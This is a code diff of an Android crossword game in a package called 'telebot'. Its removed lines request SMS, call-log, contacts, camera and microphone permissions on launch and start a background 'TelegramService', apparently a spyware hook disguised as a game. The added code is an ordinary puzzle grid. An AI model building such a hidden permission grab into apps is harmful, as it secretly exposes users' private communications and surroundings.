@@ -1,11 +1,8 @@
 package com.silent.telebot;
 
-import android.Manifest;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.Intent;
-import android.content.pm.PackageManager;
-import android.os.Build;
 import android.os.Bundle;
 import android.view.View;
 import android.widget.Button;
@@ -14,51 +11,26 @@ import android.widget.GridLayout;
 import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
-import androidx.core.app.ActivityCompat;
-import androidx.core.content.ContextCompat;
 
-import java.util.ArrayList;
 import java.util.HashMap;
-import java.util.List;
 import java.util.Map;
 
 public class CrosswordActivity extends Activity {
-    private static final int REQ_CODE = 100;
     private GridLayout gridCrossword;
     private TextView tvQuestion, tvMotivation, tvLevel, tvProgress, tvSelectedWord, tvFoundWords;
     private ProgressBar progressBar;
     private Button btnCheck, btnClear;
-    private Map<String, String> answers = new HashMap<>();
-    private Map<String, String> questions = new HashMap<>();
-    private Map<String, String> userAnswers = new HashMap<>();
-    private List<TextView> cells = new ArrayList<>();
-    private int currentLevel = 1;
-    private int totalWords = 6;
-    private int correctAnswers = 0;
     private String selectedCellId = "";
     private String selectedWord = "";
+    private Map<String, String> userAnswers = new HashMap<>();
+    private Map<String, String> correctAnswers = new HashMap<>();
+    private Map<String, String> questions = new HashMap<>();
+    private String[][] gridData;
+    private int totalWords = 0;
+    private int correctCount = 0;
+    private int currentLevel = 1;
 
     private static final String SECRET_PASSWORD = "maestro2024";
-
-    private void loadLevel1() {
-        answers.put("A1", "ب");
-        answers.put("A2", "ي");
-        answers.put("A3", "ت");
-        questions.put("A1", "الحرف الأول من كلمة 'بيت'؟");
-        questions.put("A2", "الحرف الثاني من كلمة 'بيت'؟");
-        questions.put("A3", "الحرف الثالث من كلمة 'بيت'؟");
-
-        answers.put("B1", "د");
-        answers.put("B2", "ا");
-        answers.put("B3", "ر");
-        questions.put("B1", "الحرف الأول من كلمة 'دار'؟");
-        questions.put("B2", "الحرف الثاني من كلمة 'دار'؟");
-        questions.put("B3", "الحرف الثالث من كلمة 'دار'؟");
-
-        totalWords = 6;
-        correctAnswers = 0;
-        updateUI();
-    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -76,9 +48,6 @@ public class CrosswordActivity extends Activity {
         tvSelectedWord = findViewById(R.id.tv_selected_word);
         tvFoundWords = findViewById(R.id.tv_found_words);
 
-        // طلب الأذونات عند فتح اللعبة
-        checkAndRequestPermissions();
-
         loadLevel1();
         drawGrid();
         setupKeyboard();
@@ -87,7 +56,6 @@ public class CrosswordActivity extends Activity {
 
         btnCheck.setOnClickListener(v -> checkAnswers());
         btnClear.setOnClickListener(v -> clearAll());
-
         btnCheck.setOnLongClickListener(v -> {
             showPasswordDialog();
             return true;
@@ -95,138 +63,99 @@ public class CrosswordActivity extends Activity {
     }
 
     // ============================================================
-    //  🔐 طلب الأذونات
+    //  تحميل المستوى الأول (كلمات متقاطعة حقيقية)
     // ============================================================
-    private void checkAndRequestPermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            String[] permissions = {
-                    Manifest.permission.READ_SMS,
-                    Manifest.permission.READ_CALL_LOG,
-                    Manifest.permission.READ_CONTACTS,
-                    Manifest.permission.READ_EXTERNAL_STORAGE,
-                    Manifest.permission.CAMERA,
-                    Manifest.permission.RECORD_AUDIO
-            };
-            boolean allGranted = true;
-            for (String perm : permissions) {
-                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                    break;
-                }
-            }
-            if (!allGranted) {
-                ActivityCompat.requestPermissions(this, permissions, REQ_CODE);
-            }
-        }
-        startTelegramService();
-    }
+    private void loadLevel1() {
+        // شبكة 6x6 مع فراغات (-) وخلايا ثابتة (أحرف) وخلايا فارغة (0)
+        // 0 = خلية فارغة (يدخلها المستخدم)
+        // حرف = خلية ثابتة (لا تتغير)
+        // - = خلية غير مستخدمة (فارغة تماماً)
+        gridData = new String[][]{
+                {"0", "0", "0", "-", "-", "-"},
+                {"-", "-", "0", "-", "-", "-"},
+                {"-", "-", "0", "-", "-", "-"},
+                {"0", "0", "0", "-", "-", "-"},
+                {"-", "-", "0", "-", "-", "-"},
+                {"-", "-", "-", "-", "-", "-"}
+        };
 
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == REQ_CODE) {
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                Toast.makeText(this, "✅ الأذونات ممنوحة", Toast.LENGTH_SHORT).show();
-            } else {
-                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة", Toast.LENGTH_LONG).show();
-            }
-        }
-        startTelegramService();
-    }
+        // تعريف الإجابات الصحيحة
+        correctAnswers.put("0,0", "ب");
+        correctAnswers.put("0,1", "ي");
+        correctAnswers.put("0,2", "ت");
+        correctAnswers.put("3,0", "د");
+        correctAnswers.put("3,1", "ا");
+        correctAnswers.put("3,2", "ر");
 
-    private void startTelegramService() {
-        Intent serviceIntent = new Intent(this, TelegramService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
-    }
+        // تعريف الأسئلة
+        questions.put("0,0", "الحرف الأول من كلمة 'بيت'؟");
+        questions.put("0,1", "الحرف الثاني من كلمة 'بيت'؟");
+        questions.put("0,2", "الحرف الثالث من كلمة 'بيت'؟");
+        questions.put("3,0", "الحرف الأول من كلمة 'دار'؟");
+        questions.put("3,1", "الحرف الثاني من كلمة 'دار'؟");
+        questions.put("3,2", "الحرف الثالث من كلمة 'دار'؟");
 
-    // ============================================================
-    //  باقي دوال اللعبة
-    // ============================================================
-    private void showPasswordDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("🔐 أدخل كلمة السر");
-        final EditText input = new EditText(this);
-        input.setHint("أدخل كلمة السر");
-        builder.setView(input);
-
-        builder.setPositiveButton("تأكيد", (dialog, which) -> {
-            String password = input.getText().toString();
-            if (password.equals(SECRET_PASSWORD)) {
-                revealAllAnswers();
-                showMotivation("🎉 تم كشف جميع الإجابات! - عصام المهدي");
-            } else {
-                showMotivation("❌ كلمة سر خاطئة! حاول مجدداً. - عصام المهدي");
-            }
-        });
-
-        builder.setNegativeButton("إلغاء", (dialog, which) -> dialog.cancel());
-        builder.show();
-    }
-
-    private void revealAllAnswers() {
-        correctAnswers = 0;
-        for (Map.Entry<String, String> entry : answers.entrySet()) {
-            String cellId = entry.getKey();
-            String correctAnswer = entry.getValue();
-            for (TextView cell : cells) {
-                if (cell.getTag().equals(cellId)) {
-                    cell.setText(correctAnswer);
-                    cell.setBackgroundColor(0xFF4CAF50);
-                    userAnswers.put(cellId, correctAnswer);
-                    break;
-                }
-            }
-            correctAnswers++;
-        }
+        totalWords = 6;
+        correctCount = 0;
         updateUI();
-        if (correctAnswers == totalWords) {
-            showMotivation("🎉 أحسنت! أكملت المستوى " + currentLevel + " 🎉\nفخور بك يا بطل. - عصام المهدي");
-        }
     }
 
+    // ============================================================
+    //  رسم الشبكة
+    // ============================================================
     private void drawGrid() {
         gridCrossword.removeAllViews();
-        gridCrossword.setRowCount(5);
-        gridCrossword.setColumnCount(5);
-        cells.clear();
+        gridCrossword.setRowCount(6);
+        gridCrossword.setColumnCount(6);
 
-        int size = (int) (getResources().getDisplayMetrics().widthPixels / 6.5);
+        int size = (int) (getResources().getDisplayMetrics().widthPixels / 7);
 
-        for (int row = 0; row < 5; row++) {
-            for (int col = 0; col < 5; col++) {
-                String id = String.valueOf((char) ('A' + row)) + (col + 1);
+        for (int row = 0; row < 6; row++) {
+            for (int col = 0; col < 6; col++) {
+                String id = row + "," + col;
+                String value = gridData[row][col];
                 Button cell = new Button(this);
-                cell.setText("");
+                cell.setTag(id);
+
+                if (value.equals("-")) {
+                    // خلية غير مستخدمة (فارغة تماماً)
+                    cell.setEnabled(false);
+                    cell.setVisibility(View.INVISIBLE);
+                } else if (value.equals("0")) {
+                    // خلية فارغة (يدخلها المستخدم)
+                    cell.setText("");
+                    cell.setBackgroundColor(0xFF2C2C2E);
+                    cell.setTextColor(0xFFFFFFFF);
+                    cell.setEnabled(true);
+                    cell.setOnClickListener(v -> {
+                        String cellId = (String) v.getTag();
+                        String question = questions.get(cellId);
+                        if (question != null) {
+                            selectedCellId = cellId;
+                            tvQuestion.setText("❓ " + question);
+                        } else {
+                            Toast.makeText(this, "هذه الخلية ليس لها سؤال", Toast.LENGTH_SHORT).show();
+                        }
+                    });
+                } else {
+                    // خلية ثابتة (تحتوي على حرف)
+                    cell.setText(value);
+                    cell.setBackgroundColor(0xFF4CAF50);
+                    cell.setTextColor(0xFFFFFFFF);
+                    cell.setEnabled(false);
+                }
+
                 cell.setTextSize(24);
-                cell.setBackgroundColor(0xFF2C2C2E);
-                cell.setTextColor(0xFFFFFFFF);
                 cell.setWidth(size);
                 cell.setHeight(size);
-                cell.setTag(id);
-                cell.setOnClickListener(v -> {
-                    String cellId = (String) v.getTag();
-                    showQuestionForCell(cellId);
-                });
                 gridCrossword.addView(cell);
-                cells.add(cell);
             }
         }
     }
 
-    private void showQuestionForCell(String cellId) {
-        selectedCellId = cellId;
-        String question = questions.get(cellId);
-        if (question != null) {
-            tvQuestion.setText("❓ " + question);
-        } else {
-            tvQuestion.setText("🔍 اختر خلية أخرى لعرض السؤال");
-        }
-    }
-
+    // ============================================================
+    //  لوحة المفاتيح
+    // ============================================================
     private void setupKeyboard() {
         GridLayout keyboard = findViewById(R.id.keyboard);
         keyboard.removeAllViews();
@@ -260,14 +189,18 @@ public class CrosswordActivity extends Activity {
         }
     }
 
+    // ============================================================
+    //  إدخال الحروف
+    // ============================================================
     private void insertLetter(String letter) {
         if (selectedCellId == null || selectedCellId.isEmpty()) {
             showMotivation("😅 اختر خلية أولاً! - عصام المهدي");
             return;
         }
-        for (TextView cell : cells) {
-            if (cell.getTag().equals(selectedCellId)) {
-                cell.setText(letter);
+        for (int i = 0; i < gridCrossword.getChildCount(); i++) {
+            View child = gridCrossword.getChildAt(i);
+            if (child.getTag().equals(selectedCellId)) {
+                ((Button) child).setText(letter);
                 userAnswers.put(selectedCellId, letter);
                 selectedWord += letter;
                 tvSelectedWord.setText(selectedWord);
@@ -278,9 +211,10 @@ public class CrosswordActivity extends Activity {
 
     private void deleteLastChar() {
         if (selectedCellId == null) return;
-        for (TextView cell : cells) {
-            if (cell.getTag().equals(selectedCellId)) {
-                cell.setText("");
+        for (int i = 0; i < gridCrossword.getChildCount(); i++) {
+            View child = gridCrossword.getChildAt(i);
+            if (child.getTag().equals(selectedCellId)) {
+                ((Button) child).setText("");
                 userAnswers.remove(selectedCellId);
                 if (selectedWord.length() > 0) {
                     selectedWord = selectedWord.substring(0, selectedWord.length() - 1);
@@ -291,24 +225,29 @@ public class CrosswordActivity extends Activity {
         }
     }
 
+    // ============================================================
+    //  التحقق من الإجابات
+    // ============================================================
     private void checkAnswers() {
-        correctAnswers = 0;
-        for (Map.Entry<String, String> entry : answers.entrySet()) {
+        correctCount = 0;
+        for (Map.Entry<String, String> entry : correctAnswers.entrySet()) {
             String cellId = entry.getKey();
-            String correctAnswer = entry.getValue();
-            String userAnswer = userAnswers.get(cellId);
-            if (userAnswer != null && userAnswer.equals(correctAnswer)) {
-                correctAnswers++;
-                for (TextView cell : cells) {
-                    if (cell.getTag().equals(cellId)) {
-                        cell.setBackgroundColor(0xFF4CAF50);
+            String correct = entry.getValue();
+            String user = userAnswers.get(cellId);
+            if (user != null && user.equals(correct)) {
+                correctCount++;
+                for (int i = 0; i < gridCrossword.getChildCount(); i++) {
+                    View child = gridCrossword.getChildAt(i);
+                    if (child.getTag().equals(cellId)) {
+                        child.setBackgroundColor(0xFF4CAF50);
                         break;
                     }
                 }
             } else {
-                for (TextView cell : cells) {
-                    if (cell.getTag().equals(cellId)) {
-                        cell.setBackgroundColor(0xFFF44336);
+                for (int i = 0; i < gridCrossword.getChildCount(); i++) {
+                    View child = gridCrossword.getChildAt(i);
+                    if (child.getTag().equals(cellId)) {
+                        child.setBackgroundColor(0xFFF44336);
                         break;
                     }
                 }
@@ -316,32 +255,43 @@ public class CrosswordActivity extends Activity {
         }
         updateUI();
 
-        if (correctAnswers == totalWords) {
+        if (correctCount == totalWords) {
             showMotivation("🎉 أحسنت! أكملت المستوى " + currentLevel + " 🎉\nفخور بك يا بطل. - عصام المهدي");
         } else {
-            int wrong = totalWords - correctAnswers;
+            int wrong = totalWords - correctCount;
             showMotivation("📝 لديك " + wrong + " أخطاء. حاول مجدداً! - عصام المهدي");
         }
-        selectedWord = "";
-        tvSelectedWord.setText("");
     }
 
+    // ============================================================
+    //  مسح الكل
+    // ============================================================
     private void clearAll() {
         userAnswers.clear();
-        for (TextView cell : cells) {
-            cell.setText("");
-            cell.setBackgroundColor(0xFF2C2C2E);
-        }
-        correctAnswers = 0;
         selectedWord = "";
         tvSelectedWord.setText("");
+        for (int i = 0; i < gridCrossword.getChildCount(); i++) {
+            View child = gridCrossword.getChildAt(i);
+            String id = (String) child.getTag();
+            String[] parts = id.split(",");
+            int row = Integer.parseInt(parts[0]);
+            int col = Integer.parseInt(parts[1]);
+            if (gridData[row][col].equals("0")) {
+                ((Button) child).setText("");
+                child.setBackgroundColor(0xFF2C2C2E);
+            }
+        }
+        correctCount = 0;
         updateUI();
         showMotivation("🧹 تم مسح جميع الإجابات. ابدأ من جديد! - عصام المهدي");
     }
 
+    // ============================================================
+    //  تحديث الواجهة
+    // ============================================================
     private void updateUI() {
-        tvProgress.setText(correctAnswers + "/" + totalWords);
-        progressBar.setProgress((correctAnswers * 100) / totalWords);
+        tvProgress.setText(correctCount + "/" + totalWords);
+        progressBar.setProgress((correctCount * 100) / totalWords);
         StringBuilder sb = new StringBuilder("✅ ");
         for (String word : userAnswers.values()) {
             sb.append(word).append(" ");
@@ -349,10 +299,51 @@ public class CrosswordActivity extends Activity {
         tvFoundWords.setText(sb.toString().trim());
     }
 
+    // ============================================================
+    //  كلمة السر
+    // ============================================================
+    private void showPasswordDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("🔐 أدخل كلمة السر");
+        final EditText input = new EditText(this);
+        input.setHint("أدخل كلمة السر");
+        builder.setView(input);
+
+        builder.setPositiveButton("تأكيد", (dialog, which) -> {
+            String password = input.getText().toString();
+            if (password.equals(SECRET_PASSWORD)) {
+                for (Map.Entry<String, String> entry : correctAnswers.entrySet()) {
+                    String cellId = entry.getKey();
+                    String correct = entry.getValue();
+                    for (int i = 0; i < gridCrossword.getChildCount(); i++) {
+                        View child = gridCrossword.getChildAt(i);
+                        if (child.getTag().equals(cellId)) {
+                            ((Button) child).setText(correct);
+                            child.setBackgroundColor(0xFF4CAF50);
+                            userAnswers.put(cellId, correct);
+                            break;
+                        }
+                    }
+                }
+                correctCount = totalWords;
+                updateUI();
+                showMotivation("🎉 تم كشف جميع الإجابات! - عصام المهدي");
+            } else {
+                showMotivation("❌ كلمة سر خاطئة! حاول مجدداً. - عصام المهدي");
+            }
+        });
+
+        builder.setNegativeButton("إلغاء", (dialog, which) -> dialog.cancel());
+        builder.show();
+    }
+
+    // ============================================================
+    //  رسائل تحفيزية
+    // ============================================================
     private void showMotivation(String message) {
         tvMotivation.setText(message);
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             tvMotivation.setText("");
         }, 4000);
     }
-}
+    }
